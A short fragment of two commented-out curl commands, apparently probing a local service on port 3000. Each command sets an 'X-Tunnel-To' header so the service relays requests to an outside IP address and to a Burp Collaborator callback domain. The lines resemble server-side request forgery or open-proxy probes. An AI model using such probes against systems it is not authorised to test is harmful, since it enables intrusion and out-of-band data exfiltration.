#for i in $(seq 301 303); do echo $i;curl localhost:3000/a -X GET -H "X-Tunnel-To: 134.209.159.110\check.php?a=$i" -v; done


#curl localhost:3000/a -X POST -H "X-Tunnel-To: 7ckiwj92ke9smlorhbdph2jby24ssh.burpcollaborator.net" -H "dasd:asd" --data "hello:hello"
